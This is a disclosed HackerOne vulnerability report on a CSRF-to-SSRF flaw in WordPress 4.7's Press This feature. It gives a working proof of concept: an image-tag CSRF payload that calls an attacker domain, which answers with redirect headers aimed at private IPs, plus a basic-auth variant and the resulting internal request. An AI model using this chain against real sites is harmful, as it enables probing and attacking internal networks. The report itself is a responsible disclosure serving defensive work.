# Wordpress 4.7 - CSRF -> HTTP SSRF any private ip:port and basic-auth

## Report Details
- **Report ID**: 187520
- **URL**: https://hackerone.com/reports/187520
- **State**: Closed
- **Severity**: high
- **Submitted**: 2016-12-01T23:02:27.537Z
- **Disclosed**: 2017-11-20T09:59:51.248Z

## Reporter
- **Username**: skansing
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: wordpress

## Vulnerability Information
#Description
This report is a variant on report #110801 but with broader vector.
#110801 was a XSRF SSRF that allowd unintended GET requests to 0.0.0.0 on port 80, 443 and 8080.

This vulnerability uses same entry vector of the `press this` scrape function but entirely bypasses the ip and port filter allowing the SSRF to any ip, port and appending basic-auth headers.

The ip:port bypass is made by forging a CSRF to `wp-admin/press-this.php?u=http://[HOST|IP]` with a **valid** hostname/ip. The valid host will then reply with a crafted header targeting `location: http://[privateip]:[port]` like *192.168.01, 127.0.01:11211 ..* resulting in the final SSRF. The redirect can also include a basic-auth which the server adds as a **Authorization** header.

#PoC
The PoC is very similar to #110801 but with a addition of a valid domain which replies with a redirection header and http code.

Victim has privileges to use press-this of example.com

- Victim has a session running
- Victim gets a payload similar to `<img src="//example.com/wp-admin/press-this.php?u=http://attackers-domain.com&url-scan-submit=Scan" />
- Victim sends a scrape request to attackers-domain.com
- Attackers domain replies with a 302 and a location header 
```
Location: http://192.168.0.1:12345
```
- Server blindly follows redirect and the internal ip gets hit.

This can be escalated by adding a basic auth scheme to the redirect url as
```
Location: http://admin:admin@192.168.0.1:12345
```

Listening to the SSRF on 192.168.0.1 would yield a incoming HTTP from the victims server carrying a basic-auth header crafted towards the internal endpoint.
```
GET / HTTP/1.1
Host: 192.168.0.1:12345
Authorization: Basic YWRtaW46YWRtaW4=
User-Agent: Press This (WordPress/4.7-RC1);
Accept: */*
Accept-Encoding: deflate, gzip
Referer: http://admin:admin@192.168.0.1:12345/
Connection: close
```



## Attachments
No attachments
